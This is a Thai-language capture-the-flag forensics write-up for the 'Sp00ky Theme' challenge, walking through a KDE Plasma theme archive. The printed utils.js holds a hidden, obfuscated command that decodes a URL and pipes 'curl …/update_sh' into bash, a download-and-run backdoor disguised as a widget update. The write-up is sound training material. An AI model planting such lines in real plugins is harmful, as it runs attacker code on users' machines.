Hi, Can you speak Thai ?

Yes, I can speak Thai.

มา วันนี้เราจะมาทำข้อ Sp00ky Theme หมวด Forensics ระดับ Very easy

Step 1 สร้าง Directory และนำเข้าไฟล์

```
mkdir <new directory>
```
ใช้คำสั่ง mkdir ใช้สำหรับสร้างไดเรกทอรี (หรือโฟลเดอร์) ใหม่บนระบบไฟล์
```
cd <new directory>
```
ตามด้วย คำสั่ง cd ใช้สำหรับเปลี่ยนไดเรกทอรีหรือโฟลเดอร์ปัจจุบันในเทอร์มินัล

ตามด้วย คำสั่ง mv ใช้ในการย้ายหรือเปลี่ยนชื่อไฟล์และไดเร็กทอรี ในที่นี้เราจะใช้คำสั่ง mv ในการย้ายไฟล์

```
┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir isusgrace03

┌──(kali㉿kali)-[~/Downloads]
└─$ cd isusgrace03

┌──(kali㉿kali)-[~/Downloads/isusgrace03]
└─$ mv ~/Downloads/'Sp00ky Theme.zip' /home/kali/Downloads/isusgrace03/                                                                                         
```

Step 2 unzip
```
┌──(kali㉿kali)-[~/Downloads/isusgrace03]
└─$ ls
'Sp00ky Theme.zip'
```
คำสั่ง ls ใช้แสดงรายการไฟล์และไดเรกทอรีที่มีอยู่ในไดเรกทอรีปัจจุบัน ในส่วนนี้เราต้องการตรวจสอบเฉย ๆ ว่าไฟล์ถูกย้ายมาหรือไม่
```
┌──(kali㉿kali)-[~/Downloads/isusgrace03]
└─$ unzip 'Sp00ky Theme.zip'

Archive:  Sp00ky Theme.zip
   creating: plasma/
   creating: plasma/look-and-feel/
   creating: plasma/look-and-feel/Otto/
[Sp00ky Theme.zip] plasma/look-and-feel/Otto/metadata.json password:
  inflating: plasma/look-and-feel/Otto/metadata.json  
   creating: plasma/look-and-feel/Otto/contents/
  inflating: plasma/look-and-feel/Otto/contents/defaults  
   creating: plasma/look-and-feel/Otto/contents/layouts/
  inflating: plasma/look-and-feel/Otto/contents/layouts/org.kde.plasma.desktop-layout.js  
   creating: plasma/look-and-feel/Otto/contents/previews/
  inflating: plasma/look-and-feel/Otto/contents/previews/fullscreenpreview.jpg  
  inflating: plasma/look-and-feel/Otto/contents/previews/preview.png  
   creating: plasma/desktoptheme/
   creating: plasma/desktoptheme/Otto/
  inflating: plasma/desktoptheme/Otto/colors  
  inflating: plasma/desktoptheme/Otto/metadata.json  
  inflating: plasma/desktoptheme/Otto/plasmarc  
   creating: plasma/desktoptheme/Otto/dialogs/
 extracting: plasma/desktoptheme/Otto/dialogs/background.svgz  
   creating: plasma/desktoptheme/Otto/icons/
 extracting: plasma/desktoptheme/Otto/icons/akonadi.svgz  
 extracting: plasma/desktoptheme/Otto/icons/akregator.svgz  
 extracting: plasma/desktoptheme/Otto/icons/amarok.svgz  
 extracting: plasma/desktoptheme/Otto/icons/applications.svgz  
 extracting: plasma/desktoptheme/Otto/icons/apport.svgz  
 extracting: plasma/desktoptheme/Otto/icons/audio.svgz  
 extracting: plasma/desktoptheme/Otto/icons/battery.svgz  
 extracting: plasma/desktoptheme/Otto/icons/bookmarks.svgz  
 extracting: plasma/desktoptheme/Otto/icons/cantata.svgz  
 extracting: plasma/desktoptheme/Otto/icons/computer.svgz  
 extracting: plasma/desktoptheme/Otto/icons/configure.svgz  
 extracting: plasma/desktoptheme/Otto/icons/device.svgz  
 extracting: plasma/desktoptheme/Otto/icons/disk.svgz  
 extracting: plasma/desktoptheme/Otto/icons/distribute.svgz  
 extracting: plasma/desktoptheme/Otto/icons/document.svgz  
 extracting: plasma/desktoptheme/Otto/icons/drive.svgz  
 extracting: plasma/desktoptheme/Otto/icons/edit.svgz  
 extracting: plasma/desktoptheme/Otto/icons/fcitx.svgz  
 extracting: plasma/desktoptheme/Otto/icons/go.svgz  
 extracting: plasma/desktoptheme/Otto/icons/ime.svgz  
 extracting: plasma/desktoptheme/Otto/icons/input.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kalarm.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kdeconnect.svgz  
 extracting: plasma/desktoptheme/Otto/icons/keyboard.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kget.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kgpg.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kleopatra.svgz  
 extracting: plasma/desktoptheme/Otto/icons/klipper.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kmail.svgz  
 extracting: plasma/desktoptheme/Otto/icons/konv_message.svgz  
 extracting: plasma/desktoptheme/Otto/icons/konversation.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kopete.svgz  
 extracting: plasma/desktoptheme/Otto/icons/korgac.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kpackagekit.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kruler.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kteatime.svgz  
 extracting: plasma/desktoptheme/Otto/icons/ktorrent.svgz  
 extracting: plasma/desktoptheme/Otto/icons/kup.svgz  
 extracting: plasma/desktoptheme/Otto/icons/list.svgz  
 extracting: plasma/desktoptheme/Otto/icons/mail.svgz  
 extracting: plasma/desktoptheme/Otto/icons/media.svgz  
 extracting: plasma/desktoptheme/Otto/icons/mobile.svgz  
 extracting: plasma/desktoptheme/Otto/icons/network.svgz  
 extracting: plasma/desktoptheme/Otto/icons/notification.svgz  
 extracting: plasma/desktoptheme/Otto/icons/osd.svgz  
 extracting: plasma/desktoptheme/Otto/icons/phone.svgz  
 extracting: plasma/desktoptheme/Otto/icons/plasmavault.svgz  
 extracting: plasma/desktoptheme/Otto/icons/plasmavault_error.svgz  
 extracting: plasma/desktoptheme/Otto/icons/preferences.svgz  
 extracting: plasma/desktoptheme/Otto/icons/printer.svgz  
 extracting: plasma/desktoptheme/Otto/icons/quassel.svgz  
 extracting: plasma/desktoptheme/Otto/icons/search.svgz  
 extracting: plasma/desktoptheme/Otto/icons/slc.svgz  
 extracting: plasma/desktoptheme/Otto/icons/software.svgz  
 extracting: plasma/desktoptheme/Otto/icons/start.svgz  
 extracting: plasma/desktoptheme/Otto/icons/system.svgz  
 extracting: plasma/desktoptheme/Otto/icons/touchpad.svgz  
 extracting: plasma/desktoptheme/Otto/icons/user.svgz  
 extracting: plasma/desktoptheme/Otto/icons/video-card.svgz  
 extracting: plasma/desktoptheme/Otto/icons/video.svgz  
 extracting: plasma/desktoptheme/Otto/icons/view.svgz  
 extracting: plasma/desktoptheme/Otto/icons/vlc.svgz  
 extracting: plasma/desktoptheme/Otto/icons/wallet.svgz  
 extracting: plasma/desktoptheme/Otto/icons/window.svgz  
 extracting: plasma/desktoptheme/Otto/icons/yakuake.svgz  
 extracting: plasma/desktoptheme/Otto/icons/zoom.svgz  
   creating: plasma/desktoptheme/Otto/weather/
 extracting: plasma/desktoptheme/Otto/weather/wind-arrows.svgz  
   creating: plasma/desktoptheme/Otto/widgets/
 extracting: plasma/desktoptheme/Otto/widgets/action-overlays.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/actionbutton.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/analog_meter.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/arrows.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/background.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/bar_meter_horizontal.svgz  
  inflating: plasma/desktoptheme/Otto/widgets/bar_meter_vertical.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/branding.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/busywidget.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/button.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/calendar.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/checkmarks.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/clock.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/configuration-icons.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/containment-controls.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/dragger.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/frame.svgz  
  inflating: plasma/desktoptheme/Otto/widgets/glowbar.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/line.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/lineedit.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/listitem.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/margins-highlight.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/media-delegate.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/menubaritem.svgz  
  inflating: plasma/desktoptheme/Otto/widgets/monitor.svgz  
  inflating: plasma/desktoptheme/Otto/widgets/notes.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/pager.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/panel-background.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/picker.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/plasmoidheading.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/plot-background.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/radiobutton.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/scrollbar.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/scrollwidget.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/slider.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/switch.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/tabbar.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/tasks.svgz  
  inflating: plasma/desktoptheme/Otto/widgets/timer.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/toolbar.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/tooltip.svgz  
 extracting: plasma/desktoptheme/Otto/widgets/translucentbackground.svgz  
  inflating: plasma/desktoptheme/Otto/widgets/viewitem.svgz  
   creating: plasma/plasmoids/
   creating: plasma/plasmoids/org.kde.netspeedWidget/
  inflating: plasma/plasmoids/org.kde.netspeedWidget/metadata.json  
   creating: plasma/plasmoids/org.kde.netspeedWidget/contents/
   creating: plasma/plasmoids/org.kde.netspeedWidget/contents/code/
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/code/utils.js  
   creating: plasma/plasmoids/org.kde.netspeedWidget/contents/config/
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/config/config.qml  
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/config/main.xml  
   creating: plasma/plasmoids/org.kde.netspeedWidget/contents/ui/
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/ui/CompactRepresentation.qml  
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/ui/Launcher.qml  
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/ui/main.qml  
   creating: plasma/plasmoids/org.kde.netspeedWidget/contents/ui/config/
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/ui/config/AppMenuDialog.qml  
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/ui/config/AppPicker.qml  
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/ui/config/ColorPicker.qml  
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/ui/config/ConfigAdvanced.qml  
  inflating: plasma/plasmoids/org.kde.netspeedWidget/contents/ui/config/ConfigGeneral.qml  
```
คำสั่ง unzip ใช้สำหรับแตกไฟล์ที่ถูกบีบอัดในรูปแบบ .zip เพื่อดึงไฟล์และโฟลเดอร์ทั้งหมดออกมาจากไฟล์เก็บถาวรนั้น (ไฟล์ที่เราเลือกจะแตก) 
```
┌──(kali㉿kali)-[~/Downloads/isusgrace03]
└─$ ls -la
total 1408
drwxrwxr-x  3 kali kali    4096 Oct 21 22:27  .
drwxr-xr-x 60 kali kali   24576 Oct 21 22:27  ..
drwxr-xr-x  5 kali kali    4096 Oct  3  2024  plasma
-rw-rw-r--  1 kali kali 1408399 Oct 21 22:25 'Sp00ky Theme.zip'
```
คำสั่ง ls ใช้แสดงรายการไฟล์และไดเร็กทอรีที่มีอยู่ในไดเร็กทอรีปัจจุบัน

คำสั่ง -l ออปชันนี้สั่งให้ ls แสดงผลในรูปแบบ "ยาว" (Long Listing Format) ซึ่งจะให้ข้อมูลรายละเอียดของไฟล์แต่ละไฟล์ดังนี้

- สิทธิ์ — เช่น drwxr-xr-x 

  ตัวแรกระบุชนิดไฟล์: d = directory, - = regular file, l = symlink

  ตัวต่อมาแบ่งเป็น 3 ชุด แต่ละชุด r=read w=write x=execute

- จำนวนลิงก์ — จำนวน hard links

- เจ้าของไฟล์ — ชื่อผู้ใช้ที่เป็นเจ้าของไฟล์

- กลุ่ม — ชื่อกลุ่มของไฟล์

- ขนาดไฟล์ — ขนาดเป็น bytes

- วันที่และเวลา — วันที่และเวลาที่มีการแก้ไขไฟล์ล่าสุด

- ชื่อไฟล์/ไดเร็กทอรี — ชื่อจริงของไฟล์หรือไดเร็กทอรี

Step 3 plasma
```
┌──(kali㉿kali)-[~/Downloads/isusgrace03]
└─$ cd plasma    
                                                                                             
┌──(kali㉿kali)-[~/Downloads/isusgrace03/plasma]
└─$ ls    
desktoptheme  look-and-feel  plasmoids
```
โฟลเดอร์ที่ชื่อ plasma ภายในนั้นมีไดเรกทอรีสามรายการ

Step 4 plasmoids
```
┌──(kali㉿kali)-[~/Downloads/isusgrace03/plasma]
└─$ cd plasmoids
                                                                                             
┌──(kali㉿kali)-[~/Downloads/isusgrace03/plasma/plasmoids]
└─$ ls    
org.kde.netspeedWidget
```
เมื่อเข้าไปในโฟลเดอร์ที่ชื่อ plasmoids แล้ว เราจะเจอกับไดเรกทอรี org.kde.netspeedWidget

Step 5 
```
┌──(kali㉿kali)-[~/Downloads/isusgrace03/plasma/plasmoids]
└─$ cd org.kde.netspeedWidget
                                                                                             
┌──(kali㉿kali)-[~/…/isusgrace03/plasma/plasmoids/org.kde.netspeedWidget]
└─$ ls
contents  metadata.json
```
เมื่อเข้าไปในโฟลเดอร์ที่ชื่อ org.kde.netspeedWidget แล้ว เราจะเจอกับไดเรกทอรี contents และไฟล์ metadata.json

```
┌──(kali㉿kali)-[~/…/isusgrace03/plasma/plasmoids/org.kde.netspeedWidget]
└─$ cd contents              
                                                                                             
┌──(kali㉿kali)-[~/…/plasma/plasmoids/org.kde.netspeedWidget/contents]
└─$ ls
code  config  ui
```
เมื่อเข้าไปในโฟลเดอร์ที่ชื่อ contents แล้ว เราจะเจอกับไดเรกทอรีสามรายการ ฉันเลือกที่จะเข้าไปดูข้อมูลที่อยู่ในไดเรกทอรีที่มีชื่อว่า code

```
┌──(kali㉿kali)-[~/…/plasma/plasmoids/org.kde.netspeedWidget/contents]
└─$ cd code    
                                                                                             
┌──(kali㉿kali)-[~/…/plasmoids/org.kde.netspeedWidget/contents/code]
└─$ ls
utils.js
                                                                                             
┌──(kali㉿kali)-[~/…/plasmoids/org.kde.netspeedWidget/contents/code]
└─$ cat utils.js            
const NET_DATA_SOURCE =
    "awk -v OFS=, 'NR > 2 { print substr($1, 1, length($1)-1), $2, $10 }' /proc/net/dev";

const PLASMOID_UPDATE_SOURCE =
    "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:1992/update_sh | bash"

function parseTransferData(data) {
    const transferData = {};

    for (const line of data.trim("\n").split("\n")) {
        const [name, rx, tx] = line.split(",");

        if (name === "lo") {
            continue;
        }

        transferData[name] = { rx, tx };
    }

    return transferData;
}

function calcSpeedData(prevTransferData, nextTransferData, duration) {
    const speedData = {};

    for (const key in nextTransferData) {
        if (prevTransferData && key in prevTransferData) {
            const prev = prevTransferData[key];
            const next = nextTransferData[key];
            speedData[key] = {
                down: ((next.rx - prev.rx) * 1000) / duration,
                up: ((next.tx - prev.tx) * 1000) / duration,
                downTotal: nextTransferData[key].rx,
                upTotal: nextTransferData[key].tx,
            };
        }
    }

    return speedData;
}
```
ในโฟลเดอร์ code จะมีไฟล์ utils.js ฉันใช้คำสั่ง cat เพื่อดูเนื้อหาของไฟล์
```
952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS
```
มีบรรทัดหนึ่งที่น่าสนใจ มันคือ flag ที่ถูกเข้ารหัสด้วย Base64 แต่ต้องทำการ Reverse ก่อน

กระบวนการนี้เราสามารถทำได้โดยการใช้ CyberChef 
```
echo "952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS" | rev | base64 -d
```
หรือใช้คำสั่ง echo บน kali linux
```
┌──(kali㉿kali)-[~/…/plasmoids/org.kde.netspeedWidget/contents/code]
└─$ echo "952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS" | rev | base64 -d
HTB{XXXXX}
```
นี่คือสิ่งที่ได้

XXXXX ไม่ใช้ flag นะ คือปิดไว้ จะได้ทำเอง

เพิ่มเติม
- ฉันไม่สามารถวางรูปในหน้า CyberChef ได้ เนื่องจากเกิดปัญหานิดหน่อย ฉันจะรีบหาทางแก้โดยเร็วที่สุด
